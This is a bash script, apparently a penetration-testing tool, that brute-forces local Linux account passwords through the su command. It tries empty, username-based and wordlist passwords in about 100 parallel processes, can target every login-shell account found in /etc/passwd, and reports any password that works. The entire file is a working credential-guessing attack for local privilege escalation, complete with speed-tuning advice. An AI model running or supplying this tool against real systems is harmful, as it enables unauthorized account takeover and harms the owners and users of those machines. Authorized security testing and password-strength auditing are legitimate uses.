#!/bin/bash

help="This tool bruteforces a selected user using binary su and as passwords: null password, username, reverse username and a wordlist (top12000.txt).
You can specify a username using -u <username> and a password wordlist via -w <wordlist>.
You can also specify a username wordlist using -U <userlist> to try multiple users.
Use -a to auto-detect users with valid login shells from /etc/passwd.
By default the BF default speed is using 100 su processes at the same time (each su try last 0.7s and a new su try in 0.007s) ~ 143s to complete
You can configure this times using -t (timeout su process) ans -s (sleep between 2 su processes).
Fastest recommendation: -t 0.5 (minimun acceptable) and -s 0.003 ~ 108s to complete

Example:    ./suBF.sh -u <USERNAME> [-w top12000.txt] [-t 0.7] [-s 0.007]
            ./suBF.sh -U <USERLIST> [-w top12000.txt] [-t 0.7] [-s 0.007]
            ./suBF.sh -a [-w top12000.txt] [-t 0.7] [-s 0.007]

THE USERNAME IS CASE SENSITIVE AND THIS SCRIPT DOES NOT CHECK IF THE PROVIDED USERNAME EXIST, BE CAREFUL\n\n"

WORDLIST="top12000.txt"
USER=""
USERLIST=""
AUTOMODE=""
TIMEOUTPROC="0.7"
SLEEPPROC="0.007"
while getopts "h?au:U:t:s:w:" opt; do
  case "$opt" in
    h|\?) printf "$help"; exit 0;;
    a)  AUTOMODE=1;;
    u)  USER=$OPTARG;;
    U)  USERLIST=$OPTARG;;
    t)  TIMEOUTPROC=$OPTARG;;
    s)  SLEEPPROC=$OPTARG;;
    w)  WORDLIST=$OPTARG;;
    esac
done

if ! [ "$USER" ] && ! [ "$USERLIST" ] && ! [ "$AUTOMODE" ]; then printf "$help"; exit 0; fi

if [ "$USERLIST" ] && ! [ -f "$USERLIST" ]; then echo "Userlist ($USERLIST) not found!"; exit 1; fi

if [ "$AUTOMODE" ] && ! [ -r /etc/passwd ]; then echo "/etc/passwd not readable!"; exit 1; fi

if ! [[ -p /dev/stdin ]] && ! [ $WORDLIST = "-" ] && ! [ -f "$WORDLIST" ]; then echo "Wordlist ($WORDLIST) not found!"; exit 0; fi

C=$(printf '\033')

# Get users with valid login shells from /etc/passwd
get_login_users (){
  while IFS=: read -r username _ uid _ _ _ shell; do
    # Skip users with nologin/false shells
    case "$shell" in
      */nologin|*/false|"") continue ;;
    esac
    echo "$username"
  done < /etc/passwd
}

su_try_pwd (){
  USER=$1
  PASSWORDTRY=$2
  trysu=`echo "$PASSWORDTRY" | timeout $TIMEOUTPROC su $USER -c whoami 2>/dev/null`
  if [ "$trysu" ]; then
    echo "  You can login as $USER using password: $PASSWORDTRY" | sed "s,.*,${C}[1;31;103m&${C}[0m,"
  fi
}

su_brute_user_num (){
  echo "  [+] Bruteforcing $1..."
  USER=$1
  su_try_pwd $USER "" &    #Try without password
  su_try_pwd $USER $USER & #Try username as password
  su_try_pwd $USER `echo $USER | rev 2>/dev/null` &     #Try reverse username as password

  if ! [[ -p /dev/stdin ]] && [ -f "$WORDLIST" ]; then
    while IFS='' read -r P || [ -n "${P}" ]; do # Loop through wordlist file   
      su_try_pwd $USER $P & #Try TOP TRIES of passwords (by default 2000)
      sleep $SLEEPPROC # To not overload the system
    done < $WORDLIST

  else
    cat - | while read line; do
      su_try_pwd $USER $line & #Try TOP TRIES of passwords (by default 2000)    
      sleep $SLEEPPROC # To not overload the system
    done
  fi
  wait
}

if [ "$AUTOMODE" ]; then
  # Auto mode: get users with valid shells from /etc/passwd
  echo "  [*] Auto-detecting users with valid login shells..."
  for UNAME in $(get_login_users); do
    su_brute_user_num "$UNAME"
  done
elif [ "$USERLIST" ]; then
  # Userlist mode: iterate over each username
  while IFS='' read -r UNAME || [ -n "${UNAME}" ]; do
    [ -z "$UNAME" ] && continue  # Skip empty lines
    su_brute_user_num "$UNAME"
  done < "$USERLIST"
else
  # Single user mode
  su_brute_user_num "$USER"
fi
echo "  Wordlist exhausted" | sed "s,.*,${C}[1;31;107m&${C}[0m,"
